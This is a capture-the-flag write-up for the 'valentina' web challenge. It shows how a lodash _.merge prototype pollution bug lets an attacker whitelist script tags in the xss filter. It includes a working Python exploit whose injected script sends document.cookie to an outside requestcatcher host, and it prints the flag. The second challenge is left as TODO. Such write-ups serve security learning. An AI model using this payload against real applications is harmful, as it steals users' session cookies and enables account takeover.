# valentina

Valentina contained 2 challenges sharing a vulnerability but with different applications.

## Challenge 1

```
TODO: Ask Vie for challenge desc
Summary: Valentina checks her reviews occasionally with secrets in her cookies.
```

## Walkthrough 1

Given that this project was deep into npm dependency hell the first obvious step was to check if any libraries had vulnerabilies.

```
$ npm audit
...
lodash  <=4.17.20
Severity: critical
Command Injection in lodash - https://github.com/advisories/GHSA-35jh-r3h4-6jhm
Prototype Pollution in lodash - https://github.com/advisories/GHSA-p6mc-m468-83gw
Prototype Pollution in lodash - https://github.com/advisories/GHSA-jf85-cpcp-j695
Prototype pollution in lodash - https://github.com/advisories/GHSA-x5rq-j2xg-h7qm
Prototype Pollution in lodash - https://github.com/advisories/GHSA-fvqr-27wr-82fm
...
```

Digging into these vulnerabilties and the source code unveiled that [CVE-2018-3721](https://snyk.io/test/npm/lodash/4.17.4#npm:lodash:20180130), a [prototype pollution](https://www.whitesourcesoftware.com/resources/blog/prototype-pollution-vulnerabilities/) vulnerability, was likely the target.

> The vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of Object via __proto__ causing the addition or modification of an existing property that will exist on all objects.

```js
app.post('/add_review', function (req, res) {
	// ...
	let review_template = {
		review_id: id,
		name: "Valentina",
		message: "your work is amazing!",
		stars: 5
	}

	let new_review = req.body;
	_.merge(review_template, new_review); // <-- this looks vulnerable!
	let cleaned_msg = xss(new_review.message);
	reviews.set(id, cleaned_msg);
	// ...
});
```

Now that I had a way to pollute arbitrary objects, I just needed to find a way to bypass `xss()`, an html escaping function in [xssjs](https://github.com/leizongmin/js-xss).

```js
FilterXSS.prototype.process = function (html) {
	// ...
	var options = me.options; 			// not set in valentina
	var whiteList = options.whiteList;  // looks like we can control this
	// ...
```

Reading the source code revealed that we could control the `whiteList` variable which controlled which tags were escaped.

```json
//  getDefaultWhiteList()
{
	a: ["target", "href", "title"],
	abbr: ["title"],
	address: [],
	// ...
}
```

To retreieve the cookies I addded the `script` tag to the whitelist and than had the admin visit the review.

```py
import requests

url = "http://localhost:8999/add_review"
payload = "fetch('https://crimist.requestcatcher.com/'+document.cookie)"
review = requests.post(url, headers={'content-type': 'application/json'},
                            data='{"__proto__": {"whiteList": {"script": []}}, "message": "<script>' + payload + '</script>"}')
id = review.text.split(":")[1]
print("http://localhost:8999/view_review?review_id=" + id)
```

## Solve 1

`maple{l0d4sh_more_lyk_n0da5h_haha_get_it}`

## Challenge 2

```
TODO: Ask Vie for challenge desc
```

## Walkthrough 2

TODO

## Solve 2

TODO
